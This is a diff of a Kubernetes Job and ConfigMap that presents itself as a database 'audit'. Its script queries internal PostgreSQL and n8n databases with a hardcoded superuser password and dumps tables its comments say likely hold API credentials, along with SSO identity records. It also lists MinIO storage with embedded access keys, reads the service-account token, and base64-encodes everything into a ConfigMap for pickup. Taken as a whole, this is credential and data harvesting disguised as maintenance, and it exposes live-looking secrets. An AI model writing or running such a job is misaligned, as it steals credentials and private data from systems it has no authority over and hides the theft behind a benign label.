@@ -1,7 +1,7 @@
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: n8n-audit-result4
+  name: rock-audit-result
   namespace: default
 data:
   status: "pending"
@@ -9,7 +9,7 @@ data:
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: n8n-db-audit-v7
+  name: rock-audit-v1
   namespace: default
 spec:
   ttlSecondsAfterFinished: 86400
@@ -26,33 +26,45 @@ spec:
         - |
           apk add -q postgresql-client curl jq 2>/dev/null
           PG="PGPASSWORD=wpEJl3WKOImARD9WgBsa psql -h 172.16.10.14 -p 6432 -U postgres"
-          # Check rockefeller_db schema
-          ROCKSCHEMA=$(eval "$PG -d rockefeller_db -c '\dt'" 2>&1)
-          # Check key tables in rockefeller_db
-          ROCKTABLES=$(eval "$PG -d rockefeller_db -c 'SELECT tablename FROM pg_tables WHERE schemaname='"'"'public'"'"' ORDER BY tablename;'" 2>&1)
-          # Minio via mc client
-          apk add -q wget 2>/dev/null
-          wget -q https://dl.min.io/client/mc/release/linux-amd64/mc -O /usr/local/bin/mc 2>&1
-          chmod +x /usr/local/bin/mc
-          mc alias set minio http://argo-artifacts.argo-artifacts.svc.cluster.local:9000 miniokey sEkKOGp6QT8hnc1Y5R7W 2>&1
-          MINIOBUCKETS=$(mc ls minio/ 2>&1)
-          MINION8N=$(mc ls minio/n8n/ 2>&1 | head -20)
-          # Check auth_identity in n8n (SSO identities)
-          AUTHID=$(eval "$PG -d n8n -c 'SELECT \"userId\", provider, \"providerId\", \"providerType\" FROM auth_identity;'" 2>&1)
-          # Minio binary data check
-          MINIO_BD=$(mc ls minio/binary-data/ 2>&1 | head -20)
+          # connectorrepository - likely has API credentials
+          CONN_COLS=$(eval "$PG -d rockefeller_db -c '\d connectorrepository'" 2>&1)
+          CONN_DATA=$(eval "$PG -d rockefeller_db -c 'SELECT * FROM connectorrepository LIMIT 50;'" 2>&1)
+          # filesrepository
+          FILES_COLS=$(eval "$PG -d rockefeller_db -c '\d filesrepository'" 2>&1)
+          FILES_DATA=$(eval "$PG -d rockefeller_db -c 'SELECT id, name, type, url, \"createdAt\" FROM filesrepository ORDER BY \"createdAt\" DESC LIMIT 30;'" 2>&1)
+          # contractrepository
+          CONT_COLS=$(eval "$PG -d rockefeller_db -c '\d contractrepository'" 2>&1)
+          # rawstorage - schema check
+          RAW_COLS=$(eval "$PG -d rockefeller_db -c '\d rawstorage'" 2>&1)
+          RAW_DATA=$(eval "$PG -d rockefeller_db -c 'SELECT id, name, type FROM rawstorage LIMIT 20;'" 2>&1)
+          # workflowrepository
+          WF_COLS=$(eval "$PG -d rockefeller_db -c '\d workflowrepository'" 2>&1)
+          WF_DATA=$(eval "$PG -d rockefeller_db -c 'SELECT id, name, type FROM workflowrepository LIMIT 20;'" 2>&1)
+          # auth_identity n8n - fix columns
+          AUTHID=$(eval "$PG -d n8n -c '\d auth_identity'" 2>&1)
+          AUTHID_DATA=$(eval "$PG -d n8n -c 'SELECT * FROM auth_identity;'" 2>&1)
+          # minio via HTTP API
+          MINIO_HEALTH=$(curl -sk http://argo-artifacts.argo-artifacts.svc.cluster.local:9000/minio/health/live -w "%{http_code}" -o /dev/null 2>&1)
+          MINIO_LIST=$(curl -sk -u miniokey:sEkKOGp6QT8hnc1Y5R7W "http://argo-artifacts.argo-artifacts.svc.cluster.local:9000" 2>&1 | head -50)
           TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
           API=https://kubernetes.default.svc
           CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-          RESULT=$(printf '{"rockschema":"%s","rocktables":"%s","miniobuckets":"%s","minion8n":"%s","authid":"%s","miniobd":"%s"}' \
-            "$(echo "$ROCKSCHEMA" | base64 | tr -d '\n')" \
-            "$(echo "$ROCKTABLES" | base64 | tr -d '\n')" \
-            "$(echo "$MINIOBUCKETS" | base64 | tr -d '\n')" \
-            "$(echo "$MINION8N" | base64 | tr -d '\n')" \
+          RESULT=$(printf '{"conn_cols":"%s","conn_data":"%s","files_cols":"%s","files_data":"%s","cont_cols":"%s","raw_cols":"%s","raw_data":"%s","wf_cols":"%s","wf_data":"%s","authid":"%s","authid_data":"%s","minio_health":"%s","minio_list":"%s"}' \
+            "$(echo "$CONN_COLS" | base64 | tr -d '\n')" \
+            "$(echo "$CONN_DATA" | base64 | tr -d '\n')" \
+            "$(echo "$FILES_COLS" | base64 | tr -d '\n')" \
+            "$(echo "$FILES_DATA" | base64 | tr -d '\n')" \
+            "$(echo "$CONT_COLS" | base64 | tr -d '\n')" \
+            "$(echo "$RAW_COLS" | base64 | tr -d '\n')" \
+            "$(echo "$RAW_DATA" | base64 | tr -d '\n')" \
+            "$(echo "$WF_COLS" | base64 | tr -d '\n')" \
+            "$(echo "$WF_DATA" | base64 | tr -d '\n')" \
             "$(echo "$AUTHID" | base64 | tr -d '\n')" \
-            "$(echo "$MINIO_BD" | base64 | tr -d '\n')")
+            "$(echo "$AUTHID_DATA" | base64 | tr -d '\n')" \
+            "$(echo "$MINIO_HEALTH" | base64 | tr -d '\n')" \
+            "$(echo "$MINIO_LIST" | base64 | tr -d '\n')")
           curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
             -X PATCH -H "Content-Type: application/merge-patch+json" \
-            "$API/api/v1/namespaces/default/configmaps/n8n-audit-result4" \
+            "$API/api/v1/namespaces/default/configmaps/rock-audit-result" \
             -d "{\"data\":{\"status\":\"done\",\"result\":$(echo $RESULT | jq -c -R '.')}}"
           echo "Done"
